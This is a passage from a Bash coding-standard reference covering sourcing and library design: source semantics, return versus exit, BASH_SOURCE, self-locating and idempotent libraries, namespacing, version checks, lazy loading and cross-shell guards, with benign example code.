caller captures with `$()` only if needed; failure is signalled by
`return` or a non-zero exit status, not by `exit`. The dirty form
violates each of these and is therefore both harder to reason about
and harder to test (BCS0410, BCS0411).

The exception that justifies side-effecting design: when the output
is large (multi-line text, multi-element array), pass an output
nameref (BCS0202, BCS0411) — that gives nameref-mediated mutation
without resorting to globals.

**See also**: §9.1 definition syntax, §9.3 `local` and scope, §9.4
return value via `return N`, §9.5 communicating results, §4.11
namerefs (`-n`), BCS0410 (recursive function state discipline),
BCS0411 (subshell return-value patterns), BCS0401 (function
definition).

# Part X — Sourcing, Libraries, and Modules

*Bash's `source` (alias `.`) is the primary mechanism for code reuse across scripts. This Part documents sourcing semantics and the conventions that make Bash libraries composable, distributable, and safe.*

---

---

## 10.1 `source` semantics

`source file` (POSIX alias `.`) executes `file` in the *current*
shell's environment. Every variable assignment, function definition,
trap installation, alias, and shell-option toggle made by the sourced
file persists in the caller after sourcing returns. This is the
mechanism that makes bash libraries possible: the library file is a
script that, when sourced, populates the caller's namespace.

This chapter is the **canonical owner** of the strict-mode
propagation, `return`-versus-`exit` asymmetry, and Greg-canonical
sourcing-idiom material. Other chapters (e.g. §10.4 on idempotent
guards, §10.3 on self-location) reference this chapter rather than
restating it.

### The basic mechanics

| Property | Behaviour |
|----------|-----------|
| Aliases | `.` (POSIX) and `source` (bash). Identical effect. |
| Path search | If the filename contains no `/`, bash searches `$PATH`. With a slash (relative or absolute), the path is used verbatim. |
| Executable bit | Not required. The file is read, not exec'd. |
| Persistence | All shell-state changes (variables, functions, traps, aliases, `shopt`) survive sourcing. |
| Arguments | `source file arg1 arg2` sets the file's positional parameters during sourcing; the caller's `$@` is restored on return. |

### Strict-mode propagation: the `set -e` trap

The single most under-documented fact about `source` is that the
sourced file inherits the caller's strict-mode flags. `set -e` is
*on* inside the sourced file if the caller has it on; a non-zero
status from any unchecked simple command in the sourced file will
exit the *caller's* shell.

```bash
# scenario: set -e in the caller propagates into the sourced file
# --- caller.bash ---
#!/usr/bin/env bash
set -euo pipefail
echo 'before source'
source ./lib.sh
echo 'after source'                     # unreachable

# --- lib.sh ---
echo 'inside lib'
false                                   # ⇒ caller exits here, status 1
echo 'lib continued'                    # never executed
```

The mistake is to write a library assuming "errors will be silent
because I am only being sourced." Under strict mode they are
emphatically not silent. Library authors must therefore either
(a) audit every command for failure modes, or (b) wrap risky
sections with `|| true` / `|| return N` to inspect the status
explicitly.

### `return` versus `exit` inside a sourced file

The two commands mean different things and mixing them is a
landmine. `return` at the top level of a sourced file terminates
*sourcing* and hands control back to the caller — the caller's shell
keeps running. `exit` ends the *caller's* shell entirely, regardless
of how deeply nested the sourcing is.

```bash
# scenario: return vs exit asymmetry in a sourced file
# --- caller.bash ---
#!/usr/bin/env bash
set -euo pipefail
source ./lib.sh                         # see two variants below
echo 'caller continues'                 # only printed for the return-form

# --- lib.sh — variant A: return ---
echo 'lib starting'
[[ -r /etc/myapp.conf ]] || return 0    # ⇒ caller prints "caller continues"
echo 'lib loaded conf'

# --- lib.sh — variant B: exit ---
echo 'lib starting'
[[ -r /etc/myapp.conf ]] || exit 0      # ⇒ caller's shell exits, "caller continues" never printed
echo 'lib loaded conf'
```

The rule of thumb: **`return` from a sourced file, never `exit`**,
unless the library has detected a state so corrupt that the caller
*must* be terminated. The 1-line guard `return 0` is harmless;
`exit 0` from a library kills any interactive shell that happened to
source it for autocompletion. Library authors who follow this
convention can safely be sourced from `~/.bashrc`.

### The Greg-canonical sourcing idiom

The pattern below is the bash community's accepted shape for a
library file. It combines an idempotent re-source guard, a strict-mode
propagation acknowledgement, the function-prefix namespace
convention (§10.5), and a `return`-not-`exit` discipline. Every BCS
library should match this skeleton.

```bash
# scenario: full library skeleton — idempotent, strict-mode-aware, return-discipline
# /usr/local/lib/myapp/strings.sh
#!/usr/bin/env bash
# strings.sh — string utilities for myapp.

# Reject direct execution: this file is meant to be sourced.
[[ ${BASH_SOURCE[0]} != "$0" ]] || {
  >&2 echo "Error: ${BASH_SOURCE[0]} must be sourced, not executed"
  exit 1                                # exit is correct here — we are NOT sourced
}

# Idempotent guard: re-sourcing is a no-op (§10.4).
[[ ${MYAPP_STRINGS_LOADED:-0} -eq 1 ]] && return 0
declare -gri MYAPP_STRINGS_LOADED=1     # -g because we may be inside a function (§10.8)

# Acknowledge that set -e from the caller is in force here.
# Library code must not assume the unchecked command "just continues".
# Use `|| return N` for any command whose failure should bail out of sourcing.

# --- public API (namespace-prefixed, §10.5) ---
myapp_strings_upper() {
  local -- s="${1:?usage: myapp_strings_upper STRING}"
  printf '%s' "${s^^}"
}

myapp_strings_lower() {
  local -- s="${1:?usage: myapp_strings_lower STRING}"
  printf '%s' "${s,,}"
}

# --- private helpers (single-underscore prefix, §10.6) ---
_myapp_strings_assert_nonempty() {
  [[ -n ${1:-} ]] || return 1
}

# Optional: export public functions if subshells must see them (§9.9).
# declare -fx myapp_strings_upper myapp_strings_lower

# Successful end-of-file: implicit `return 0`. Never `exit`.

```

Three notes on the skeleton. The `BASH_SOURCE[0] != "$0"` guard
correctly uses `exit` when triggered, because in that branch the
file *is* being executed directly and `return` would itself fail
("can only `return` from a function or sourced script"). The
idempotent guard uses `declare -gri` so the flag survives even when
the library is sourced for the first time *inside* a function
(§10.8). The end-of-file is bare — bash treats it as `return 0`,
which is what every successful library load should yield.

### File arguments to `source`

`source file arg1 arg2` makes `arg1`, `arg2` available as `$1`, `$2`
during the file's execution. The caller's positional parameters are
restored when sourcing returns. This mechanism is occasionally useful
for plugin-style libraries that want a configuration token without
introducing a global.

```bash
# scenario: positional parameters during sourcing
# --- plugin.sh ---
echo "plugin called with: $1"

# --- caller.bash ---
set -- one two three
source ./plugin.sh foo                  # plugin sees $1=foo
echo "caller still has: $1"             # ⇒ caller still has: one
```

The pattern is rare in BCS code; configuration is usually carried in
environment variables to avoid the implicit ordering contract.

**See also**: §10.2 (`BASH_SOURCE` array detail), §10.3
(self-locating library pattern), §10.4 (idempotent guards), §10.5
(namespace prefixes), §10.8 (lazy loading and `declare -g`), §9.9
(exporting functions), §13.2 (`set -e` semantics), BCS0101 (strict
mode), BCS0407 (library patterns), BCS-bash
`30_02_dot-source.md`.

## 10.2 The `BASH_SOURCE` array

`BASH_SOURCE` is an indexed array tracking the chain of source files
through the call stack. Together with `FUNCNAME` and `BASH_LINENO`
it gives bash its only first-class introspection of "who called
me?".

- `BASH_SOURCE[0]` — file of the *current* execution context.
- `BASH_SOURCE[N]` — file at depth N in the call stack (1 is the
  caller of the function holding 0, etc.).
- Length: `${#BASH_SOURCE[@]}` — equals `${#FUNCNAME[@]}`.
- Top-level script: `BASH_SOURCE[0]` is the script.
- Sourced library: `BASH_SOURCE[0]` is the library file.
- Function within library: `BASH_SOURCE[0]` is still the *library*
  file (the function carries its source attribution).
- Pairs with `FUNCNAME[]` (function name at each level) and
  `BASH_LINENO[]` (line number at each level). All three arrays
  are the same length.

The canonical owner of the *full* `BASH_SOURCE` anatomy is §9.11,
which uses these arrays for self-location idioms and ERR-trap stack
walks. This chapter covers the array shape; §9.11 covers the usage
patterns.

### Walk-the-stack example

The clearest way to see the relationship between the three arrays is
to print them at a function call site that has been reached through
two levels of nesting plus a sourced library.

```bash
# scenario: walk the call stack from inside a deeply-called function.
# ── /tmp/lib.sh ───────────────────────────────────────────────
report_stack() {
  local -i i
  for (( i=0; i < ${#FUNCNAME[@]}; i++ )); do
    printf '#%d  fn=%s  src=%s:%s\n' \
      "$i" \
      "${FUNCNAME[$i]:-MAIN}" \
      "${BASH_SOURCE[$i]}" \
      "${BASH_LINENO[$i]}"
  done                                         # (BCS0410, BCS0603)
}
inner() { report_stack; }
outer() { inner; }

# ── /tmp/main.sh ──────────────────────────────────────────────
#!/usr/bin/env bash
set -euo pipefail
source /tmp/lib.sh
outer
```

Output (line numbers vary):

```
#0  fn=report_stack  src=/tmp/lib.sh:3
#1  fn=inner         src=/tmp/lib.sh:11
#2  fn=outer         src=/tmp/lib.sh:12
#3  fn=source        src=/tmp/main.sh:4
#4  fn=MAIN          src=/tmp/main.sh:0
```

Notice the symmetry: index 0 is *innermost* (the currently executing
function); the outermost frame's `BASH_SOURCE` is the top-level
script. The `source` pseudo-frame at index 3 marks the boundary where
`/tmp/main.sh` sourced `/tmp/lib.sh`, and `BASH_LINENO[3]` is the
line in main.sh where the source happened. This symmetry is the basis
of every usable bash stack trace — see §13.8 ERR-trap reporting and
§9.11 for the production-grade pattern.

**See also**: §9.11 self-locating with `BASH_SOURCE` (canonical
owner of the usage patterns), §10.3 self-locating library pattern,
§9.7 function tracing (interaction with `set -T`), §13.8 the ERR
trap, BCS0410 (recursive function state discipline), BCS0603 (trap
handling).

## 10.3 Self-locating library pattern

The canonical pattern by which a library determines its own
installation directory at runtime.

```bash
lib_dir=$(realpath -- "$(dirname -- "${BASH_SOURCE[0]}")")
data_dir=$lib_dir/data
```

- Use `realpath` (not `readlink`) — see BCS-bash conventions.
- `dirname` on `${BASH_SOURCE[0]}` gives the library's directory.
- Resolves symlinks — important when installed via symlink.
- Must run at sourcing time (not call time) so it captures the
  library's *source* location, not the caller's location.
- Pitfall: running this inside a function captures the file the
  function was *defined in* — same answer either way for a single-
  file library, but matters for multi-file installations.

### Symlink resolution

The `realpath --` step is the load-bearing piece. Without it, a
library installed via symlink (the common case for system-wide
installs in `/usr/local/bin/` that point at versioned files in
`/usr/local/share/<project>/`) would compute its `data_dir`
relative to the *symlink directory*, not the actual install prefix.

```bash
# scenario: confirm self-location works through one or more symlinks.
#!/usr/bin/env bash
set -euo pipefail

# Layout used by the demo:
#   /opt/myapp-1.2/lib/strings.sh                 ← real file
#   /opt/myapp-1.2/data/messages.txt              ← data alongside the lib
#   /usr/local/lib/myapp/strings.sh -> ../../...  ← versioned symlink
#   /home/user/strings.sh           -> /usr/...   ← user-level alias

# /opt/myapp-1.2/lib/strings.sh
strings::self_locate() {
  local -- here
  here=$(realpath -- "$(dirname -- "${BASH_SOURCE[0]}")")
  printf '%s' "$here"                          # always /opt/myapp-1.2/lib (BCS0407)
}

# Sourced through any of the three paths:
source /opt/myapp-1.2/lib/strings.sh
strings::self_locate                           # ⇒ /opt/myapp-1.2/lib

source /usr/local/lib/myapp/strings.sh         # via symlink
strings::self_locate                           # ⇒ /opt/myapp-1.2/lib

source /home/user/strings.sh                   # via symlink-to-symlink
strings::self_locate                           # ⇒ /opt/myapp-1.2/lib

```

Without `realpath --`, the third invocation would return
`/home/user`, the second would return `/usr/local/lib/myapp`, and
the library's `data_dir` lookup would fail because the data tree
lives next to the *real* file, not next to the alias.

The `--` is BCS practice (BCS0307): it stops a path beginning with
`-` (rare for libraries but possible if `${BASH_SOURCE[0]}` happens
to point through a `-`-prefixed directory) from being interpreted
as an option. The `bash -c "source -someweird/lib.sh"` case is a
real-world hardening concern when input from configuration files is
involved.

**See also**: §9.11 self-locating with `BASH_SOURCE` (the same
idiom from the function-defining angle), §10.2 the `BASH_SOURCE`
array, §10.4 idempotent sourcing guards (often used immediately
after self-location), BCS0104 (FHS compliance), BCS0407 (library
patterns), BCS0307 (anti-patterns: `--` end-of-options discipline).

## 10.4 Idempotent sourcing guards

A guard at the top of a library that prevents double-loading when
two callers each source it. Critical for any library that defines
state-bearing structures (associative arrays, file-handle slots),
runs trap installations, or has costly initialisation.

```bash
[[ -n ${_MYLIB_LOADED:-} ]] && return
_MYLIB_LOADED=1
```

- Use a unique sentinel name per library (typically the library's
  namespace prefix, uppercased, with `_LOADED` suffix).
- Place at the top of the library, *before* any work.
- Avoids duplicate function definitions, redundant variable
  initialisation, and double-installed traps.
- Combined with `set -e` exemption: `[[ ]] && return` is in `&&`
  context, so the guard itself is exempt from errexit.

### Demonstrating the no-op behaviour

The simplest way to see the guard work is to add a side-effecting
print to the library and source it twice. Without the guard, the
print runs both times; with it, only the first.

```bash
# scenario: the guard makes a second `source` a clean no-op.
# ── /tmp/mylib.sh ─────────────────────────────────────────────
[[ -n ${_MYLIB_LOADED:-} ]] && return          # guard (BCS0407)
declare -gri _MYLIB_LOADED=1                   # sentinel (-g for in-function safety, §10.8)

>&2 echo 'mylib: initialising'                 # side effect — should run only once
declare -gA _MYLIB_CONFIG=()
_MYLIB_CONFIG[host]='localhost'
_MYLIB_CONFIG[port]=8080

mylib::greet() { printf 'hello, %s\n' "${1:-world}"; }

# ── /tmp/main.sh ──────────────────────────────────────────────
#!/usr/bin/env bash
set -euo pipefail
source /tmp/mylib.sh                           # ⇒ stderr: mylib: initialising
source /tmp/mylib.sh                           # ⇒ silent — guard short-circuits
source /tmp/mylib.sh                           # ⇒ silent — guard short-circuits
mylib::greet 'gd'                              # ⇒ hello, gd
echo "host=${_MYLIB_CONFIG[host]}"             # ⇒ host=localhost
```

Output: `mylib: initialising` then `hello, gd` then
`host=localhost`. The library prints its initialisation message
exactly *once*; the sentinel prevents subsequent sources from
re-running the body. Without the guard, any associative-array
initialisation would also clobber values the first source had
populated (a common "I set it and now it's gone" bug).

`declare -gri`: `-g` makes the sentinel a *global* declaration even
if the source happens inside a function (§10.8); `-r` makes it
readonly; `-i` declares integer. For non-integer sentinels,
`declare -gr` suffices.

**See also**: §10.1 `source` semantics (how `return` from a sourced
file behaves), §10.5 namespace prefixes (where `_MYLIB_` comes from),
§10.7 version negotiation (often paired with the guard so the
sentinel encodes the version), §10.8 lazy loading (`declare -g`
inside a function), BCS0407 (library patterns).

## 10.5 Namespace prefixes

Bash function names accept `::` and several other punctuation
characters, enabling Java/C++-style namespacing without recourse to
hyphens or underscores alone.

- `mylib::function_name` is a valid function name.
- Avoids collision with other libraries that may define functions of
  the same short name (`init`, `setup`, `parse`).
- Convention: library prefix in lowercase, `::` separator, snake_case
  for the function-local name.
- Equivalent: prefix with `_libname_` if `::` looks awkward in your
  codebase or if the library targets a context where `::` is
  reserved.
- Variables: prefix with `MYLIB_` (uppercase) for globals.
- Local variables in functions need no namespacing — `local`
  scoping (§9.3) suffices.

### Full library skeleton with namespace discipline

The example below defines a small string-manipulation library using
the `mylib::` convention and shows it being invoked from a separate
script. The discipline is consistent across every public function and
every public variable.

```bash
# scenario: namespaced library — definition and use.
# ── /tmp/mylib.sh ─────────────────────────────────────────────
[[ -n ${MYLIB_LOADED:-} ]] && return           # idempotent guard (§10.4)
declare -gri MYLIB_LOADED=1
declare -gr  MYLIB_VERSION='1.0.0'             # public, namespaced (BCS0204)

# Public API — namespaced with `::`.
mylib::upper() {
  local -- s="${1:?usage: mylib::upper STRING}"
  printf '%s' "${s^^}"
}

mylib::lower() {
  local -- s="${1:?usage: mylib::lower STRING}"
  printf '%s' "${s,,}"
}

mylib::trim() {
  local -- s="${1:?usage: mylib::trim STRING}"
  s="${s#"${s%%[![:space:]]*}"}"               # strip leading WS
  s="${s%"${s##*[![:space:]]}"}"               # strip trailing WS
  printf '%s' "$s"
}

# Private helpers — leading underscore (§10.6).
_mylib_assert_nonempty() {
  [[ -n ${1:-} ]] || return 1
}

# ── /tmp/use_mylib.bash ───────────────────────────────────────
#!/usr/bin/env bash
set -euo pipefail
source /tmp/mylib.sh

printf 'lib version: %s\n' "$MYLIB_VERSION"    # ⇒ lib version: 1.0.0
mylib::upper 'hello'                           # ⇒ HELLO
mylib::lower 'WORLD'                           # ⇒ world
printf '[%s]\n' "$(mylib::trim '   spaced   ')"  # ⇒ [spaced] (BCS0407)
```

The library uses `mylib::` for *every* public function, `MYLIB_` for
public variables, and `_mylib_` for internal helpers. Discipline pays
off when two libraries collide on common names like `init`,
`validate`, `lookup`. Choice between `::` and `_` is project-wide;
mixing both in one library is the thing to avoid (BCS0203).

**See also**: §9.10 naming conventions, §10.4 idempotent sourcing
guards (sentinel-name convention), §10.6 public vs private
conventions, §9.1 definition syntax, §9.9 exporting functions
(namespacing matters more for exported functions), BCS0203 (naming
conventions), BCS0407 (library patterns).

## 10.6 Public vs private conventions

A library that distinguishes its API from its internals can evolve
its internals without breaking callers. Bash provides no actual
visibility control; the convention substitutes for the missing
language feature.

- **Public functions**: bare names (after the namespace prefix —
  `mylib::greet`), documented in the library header.
- **Private functions**: leading underscore — `_mylib_helper` (or
  `mylib::_helper`).
- Documented only the public API; private functions may change
  without notice in any patch release.
- Variables follow the same convention.
- BCS recommends explicit documentation of the public name list in
  the library header (BCS0407) — both as discoverability and as a
  contract.

### Library-header documentation

The header below shows the expected shape: a one-line synopsis, a
list of public names, a `# Internal:` block listing private helpers
(so reviewers can see they exist without granting them API status),
and license/version metadata.

```bash
# scenario: library-header documentation block, BCS-style.
# ── /usr/local/lib/myapp/strings.sh ───────────────────────────
#!/usr/bin/env bash
# strings.sh — string utilities for myapp.
#
# Public API:
#   mylib::upper STRING        Upper-case STRING.
#   mylib::lower STRING        Lower-case STRING.
#   mylib::trim  STRING        Strip leading/trailing whitespace.
#   mylib::join  SEP ELT…      Join elements with SEP.
#   MYLIB_VERSION              Version string (declare -gr).
#
# Internal (do NOT call from outside):
#   _mylib_assert_nonempty STRING
#   _mylib_normalise_locale
#
# License: CC-BY-SA-4.0
# Version: 1.0.0
# Source : git@example.com:myapp/strings.git

[[ -n ${MYLIB_LOADED:-} ]] && return            # §10.4 (BCS0407)
declare -gri MYLIB_LOADED=1
declare -gr  MYLIB_VERSION='1.0.0'

# … public functions follow …
# … private helpers follow …

```

The header pays for discoverability (a reader sees the API without
`grep`), reviewability (private helpers are called out, not
mistaken for public during code review), and stability (the header
*is* the contract — backward compatibility on listed public names,
but not on `_mylib_*`). For larger libraries, extract the header
into a sibling `README.md` and shrink the in-file header to a
pointer.

**See also**: §10.5 namespace prefixes, §10.4 idempotent sourcing
guards, §10.7 version negotiation (the public version constant is
part of the public API), §10.10 API design, §9.10 naming
conventions, BCS0203 (naming conventions), BCS0407 (library
patterns).

## 10.7 Version negotiation

Libraries should declare a version; callers should check it. The
contract is one-way (caller refuses to load incompatible libraries),
not handshake-style — bash has no machinery for runtime negotiation.

```bash
# In library
declare -r MYLIB_VERSION_MAJOR=2
declare -r MYLIB_VERSION_MINOR=1
declare -r MYLIB_VERSION=2.1.0

# In caller
if (( MYLIB_VERSION_MAJOR != 2 )); then
  die 1 "mylib version 2.x required, got $MYLIB_VERSION"
fi
```

- Semantic versioning recommended (MAJOR.MINOR.PATCH).
- Major version incompatibility → caller errors out cleanly.
- Minor version: backward-compatible additions; a caller may check
  for a minimum minor version when it needs a recent feature.
- Use sentinel variables (not function-existence tests) for the
  version check itself — the variable is cheap, the function probe
  is fragile.

### Semver feature detection — variant pattern

For libraries that grow features additively, the caller may want to
say "I need at least version 2.3" rather than pinning an exact major.
The pattern is the same idea, with a min-version comparator.

```bash
# scenario: caller requires at least mylib 2.3.
#!/usr/bin/env bash
set -euo pipefail
source /usr/local/lib/myapp/strings.sh         # provides MYLIB_VERSION_*

require_min_version() {
  local -i need_major="$1" need_minor="$2"
  if (( MYLIB_VERSION_MAJOR > need_major )); then
    return 0                                   # newer major → assumed compatible if we said so
  fi
  if (( MYLIB_VERSION_MAJOR == need_major && MYLIB_VERSION_MINOR >= need_minor )); then
    return 0                                   # ⇒ 2.3, 2.4, … all pass
  fi
  >&2 printf 'mylib >= %d.%d required, got %s\n' \
    "$need_major" "$need_minor" "$MYLIB_VERSION"
  return 1                                     # (BCS0602)
}

require_min_version 2 3 || exit 1

# Optional fallback: feature-detect when version is unknown
# (e.g. third-party library without semver discipline).
if declare -F mylib::trim_unicode >/dev/null; then
  result=$(mylib::trim_unicode "$input")        # use the new function
else
  result=$(mylib::trim "$input")                # fall back to the old
fi

```

Two policy notes. **`> need_major` accepts newer majors** — only
correct when your project's policy is "we support all newer
majors". The opposite policy (pin to one major) replaces the first
`if` with `(( MYLIB_VERSION_MAJOR != need_major ))`. **Function-
existence checks** via `declare -F` are a useful *secondary*
mechanism for libraries that lack version discipline, but should
not replace the version variable check for libraries that have it
(BCS0204, BCS0407).

**See also**: §10.4 idempotent sourcing guards (the sentinel often
encodes the major version: `_MYLIB_V2_LOADED`), §10.6 public vs
private conventions (the version constant is part of the public
API), §10.10 API design, §9.8 listing and inspecting functions
(`declare -F` for feature detection), BCS0204 (constants and
environment variables), BCS0407 (library patterns).

## 10.8 Lazy and conditional loading

Sourcing a library has a cost — file I/O plus the cost of evaluating
every function definition, every `declare`, and any top-level code.
For a small library the cost is negligible; for a large library
sourced only to obtain one rarely-used function, it is wasted. *Lazy*
loading defers sourcing until the feature is first invoked; *conditional*
loading sources different libraries based on environment.

### Lazy loading by stub

The standard pattern replaces the heavyweight function with a thin
stub that loads the real library on first call, *replaces* itself
with the genuine implementation, and forwards the original
arguments. From the caller's view the function is always defined —
the cost is paid only when it is first used.

```bash
# scenario: lazy-load stub — real library is sourced on first call
# Cheap stub installed at script startup; real myapp_render is in lib/render.sh.
myapp_render() {
  source "${MYAPP_LIB_DIR:-/usr/local/lib/myapp}/render.sh"   # defines myapp_render itself
  myapp_render "$@"                                            # forward original args
}

# First call: source occurs, real function replaces this stub, then runs.
# Second call: real function is already in place, no source.
```

The stub overwrites itself at the moment the library is sourced
(because the library's definition of `myapp_render` clobbers the
stub). Bash's function-table semantics make this a clean replacement
with no second-call penalty. Idempotency (§10.4) is still required
inside the library, but the stub guarantees a single load in the
common case.

### The `declare -g` pitfall

The pitfall worth documenting in detail: when a library is sourced
*inside a function*, every `declare` and every assignment without
`declare` resolves to the *function's* local scope, not the global
namespace. The library's `MY_LIBRARY_VERSION='1.0'`, intended to be
visible script-wide, becomes invisible the instant the calling
function returns. Lazy loading is the canonical context that triggers
this — the lazy stub is itself a function, so the library is sourced
in function scope.

```bash
# scenario: function-scoped global pitfall — without declare -g
# --- lib.sh ---
LIB_VERSION='1.0'                       # bare assignment
declare -- LIB_NAME='strings'           # declare WITHOUT -g

# --- caller.bash ---
#!/usr/bin/env bash
set -euo pipefail

load_lib() { source ./lib.sh; }         # sourced inside a function

load_lib
echo "version=${LIB_VERSION:-UNSET}"    # ⇒ version=UNSET
echo "name=${LIB_NAME:-UNSET}"          # ⇒ name=UNSET
```

Both assignments became *locals of `load_lib`* and disappeared on
return. The fix has two parts: at the library's top, every `declare`
that should populate the caller's global namespace must use the `-g`
flag; bare assignments without `declare` are subject to the same
rule when `local` is in scope above them on the call stack
(BCS0202's reason for mandating explicit `local`).

```bash
# scenario: correct lazy-loadable library — uses declare -g for globals
# --- lib.sh ---
declare -g  LIB_VERSION='1.0'           # -g forces global scope
declare -gr LIB_NAME='strings'          # -g + readonly: global constant
declare -gi LIB_LOAD_TIME=$EPOCHSECONDS # -g + integer

# Functions are unaffected: function definitions are always global.
my_lib_function() { :; }

# --- caller.bash ---
load_lib() { source ./lib.sh; }
load_lib
echo "version=${LIB_VERSION}"           # ⇒ version=1.0
echo "name=${LIB_NAME}"                 # ⇒ name=strings
```

The `-g` flag is harmless when the library is sourced at script top
level (where `declare` and `declare -g` have the same effect) but
load-bearing when sourced from inside a function. A library that
*may* be lazy-loaded must therefore use `declare -g` *unconditionally*
for every variable it intends to export, regardless of whether the
current call site happens to be at top level.

The same rule applies to `declare -i`, `declare -r`, `declare -a`,
`declare -A`: combine each with `-g` when defining library globals.
`declare -gri` is a common BCS idiom for an immutable global integer
constant.

### Conditional loading

Different libraries for different environments — `bash`-specific
helpers when running under bash, OS-specific helpers based on
`uname`, version-specific helpers based on `BASH_VERSINFO`. The
mechanism is plain `if` plus `source`; the caveat is that the
`declare -g` rule applies if the conditional sits inside a function.

```bash
# scenario: OS-conditional library load
load_platform_lib() {
  case ${OSTYPE} in
    linux-gnu*)  source "${MYAPP_LIB_DIR}/linux.sh"  ;;
    darwin*)     source "${MYAPP_LIB_DIR}/macos.sh"  ;;
    *)           die 1 "unsupported OS: ${OSTYPE}"  ;;
  esac
}
load_platform_lib                       # both libraries must use declare -g
```

Conditional loading composes naturally with the version-detection
predicates of §10.7 (`bash_at_least 5 2`) — load a polyfill library
on older bash, a thin pass-through on new bash.

**See also**: §10.1 (`source` semantics), §10.4 (idempotent
sourcing guards), §10.7 (version negotiation), §9.3 (`local` and
scope — why `declare -g` is required), BCS0202 (variable scoping),
BCS0408 (dependency management — lazy loading guidance), BCS-bash
`30_02_dot-source.md`.

## 10.9 Cross-shell sourcing pitfalls

When a library may be sourced by both bash and another shell (sh,
dash, ksh, zsh) — or when bash itself is invoked under the name
`sh` and silently downgrades — the assumptions that hold in
strict-mode bash no longer apply.

- Detect bash at all: `[[ -n ${BASH_VERSION:-} ]]`.
- Avoid bashisms in sh-compatible code paths (`[[ ]]`, arrays,
  `${var,,}`, `<<<`, namerefs, regex, `local -n`).
- Use POSIX-only constructs in sh-compatible paths: `[ ]`, no
  arrays, no namerefs, no `<<<`, no `[[ ]]`.
- Or **refuse to load**: bash-only libraries should detect and
  bail when sourced by anything else (shown below).
- The sh-mode-of-bash trap: bash invoked as `sh` (often via
  `/bin/sh -> bash` on legacy distros) silently disables many
  features.

### Refuse-to-load guard

The cleanest cross-shell story is: declare the library bash-only,
detect the host shell, and refuse to load anywhere else. The
library author then never has to think about portability again.

```bash
# scenario: bash-only library refuses to be sourced by sh/dash/zsh.
# ── /usr/local/lib/myapp/strings.sh ───────────────────────────
# Detect bash and refuse otherwise.
if [ -z "${BASH_VERSION:-}" ]; then
  echo 'mylib: requires bash, not POSIX sh' >&2
  return 1 2>/dev/null || exit 1               # return if sourced, exit if exec'd
fi

# Detect bash invoked as sh — bash silently turns off many features.
if [[ ${0##*/} == sh || -n ${POSIXLY_CORRECT:-} ]]; then
  echo 'mylib: refusing to load under sh-emulation mode' >&2
  return 1                                     # (BCS0407)
fi

# Detect bash version — features used here need 4.4+.
if (( BASH_VERSINFO[0] < 4 )) || \
   (( BASH_VERSINFO[0] == 4 && BASH_VERSINFO[1] < 4 )); then
  printf 'mylib: bash 4.4+ required, found %s\n' "$BASH_VERSION" >&2
  return 1
fi

# … library body follows, free to use bashisms …
```

### sh-mode-of-bash trap — what is silently disabled

When bash is invoked as `sh` (its argv[0] is `sh`, or `--posix`
is set, or `POSIXLY_CORRECT` is in the environment), it disables a
long list of features that look like they should still work:

| Feature              | Disabled in sh mode? | Workaround                        |
|----------------------|----------------------|-----------------------------------|
| `[[ ]]`              | No (still works)     | —                                 |
| `(( ))`              | No (still works)     | —                                 |
| `<<<` here-string    | No (still works)     | —                                 |
| `function name { }`  | Disallowed           | use `name() { }` form             |
| Brace expansion      | Disabled             | enumerate or use globs            |
| `+B`/`-B` toggle     | Default off          | not portable                      |
| `source` keyword     | Use `.` instead      | `. lib.sh`                        |
| `${var,,}` etc.      | Still work           | —                                 |
| `BASH_ENV`           | Read at start-up     | unaffected                        |
| Process substitution | May be disabled      | use temp files                    |

The list is enough surface that most cross-shell libraries either
restrict themselves to a tiny POSIX-compatible subset or use the
refuse-to-load guard above. Mixed-mode (try-bash-first, fall-back-to-
POSIX) is rarely worth the complexity.

**See also**: §10.1 `source` semantics (`return` versus `exit`
asymmetry — the guard above relies on it), §10.10 API design,
§10.11 distribution and installation (which `bash` to require in
the shebang), §1.x bash invocation modes, BCS0102 (shebang),
BCS0407 (library patterns), BCS0409 (bash version detection).

## 10.10 API design

Designing a library API that other people will use. The rules below
are not bash-specific — they are general API hygiene — but each is
encoded in the BCS library template (BCS0407) and worth restating
because bash's looseness makes them easy to violate by accident.

- Small public surface; large private substrate.
- Consistent naming across functions in the library.
- Standard parameter order — for example, source before destination,
  or vice versa, but consistent.
- Use namerefs for output parameters; avoid mutating globals from
  the public API.
- Document side effects (variables touched, files written, traps
  installed).
- Versioned: bump major on breaking changes.
- Idempotent: sourcing twice has the same effect as once.
- Fail predictably: clear error messages, consistent exit codes
  (BCS0602).

### Canonical small-library skeleton

The skeleton below combines every preceding chapter's guidance into
one minimum-viable library. It is BCS-compliant out of the box;
real libraries grow by adding more functions, never by relaxing the
structure.

```bash
# scenario: BCS-compliant minimum-viable library skeleton.
# ── /usr/local/lib/myapp/path_utils.sh ────────────────────────
#!/usr/bin/env bash
# path_utils.sh — path normalisation utilities for myapp.
#
# Public API:
#   path_utils::canonical PATH        Print canonical absolute path on stdout.
#   path_utils::is_subdir PARENT KID  Status 0 if KID is under PARENT.
#   PATH_UTILS_VERSION                Version constant.
#
# Internal:
#   _path_utils_resolve PATH
#
# License: CC-BY-SA-4.0
# Version: 1.0.0

# §10.9 — refuse non-bash hosts.
[[ -n ${BASH_VERSION:-} ]] || {
  echo 'path_utils: requires bash' >&2
  return 1 2>/dev/null || exit 1
}

# §10.4 — idempotent guard.
[[ -n ${PATH_UTILS_LOADED:-} ]] && return
declare -gri PATH_UTILS_LOADED=1
declare -gr  PATH_UTILS_VERSION='1.0.0'        # §10.7 (BCS0204)

# Public: print canonical absolute path on stdout.
# Returns: 0 on success; 1 if PATH does not resolve.
# Side effects: none.
path_utils::canonical() {
  local -- p="${1:?usage: path_utils::canonical PATH}"
  local -- canon
  canon=$(realpath -- "$p" 2>/dev/null) || return 1
  printf '%s' "$canon"                         # output via stdout (BCS0411)
}

# Public: status 0 if KID is at or under PARENT (after canonicalisation).
path_utils::is_subdir() {
  local -- parent="${1:?usage: path_utils::is_subdir PARENT KID}"
  local -- kid="${2:?usage: path_utils::is_subdir PARENT KID}"
  local -- pcan kcan
  pcan=$(path_utils::canonical "$parent") || return 2
  kcan=$(path_utils::canonical "$kid")    || return 2
  [[ $kcan == "$pcan" || $kcan == "$pcan"/* ]]
}

# Internal helper (no public guarantee).
_path_utils_resolve() {
  realpath -- "${1:?}" 2>/dev/null
}

```

The skeleton in 30 lines covers: shebang and metadata header
(BCS0103), refuse-to-load guard (§10.9), idempotent guard (§10.4),
public version constant (§10.7), namespaced public functions
(§10.5), internal helper with leading-underscore convention (§10.6),
parameter validation via `${1:?}` enforcement, output via stdout,
status-code conventions (0 success, 1 documented failure, 2 invalid
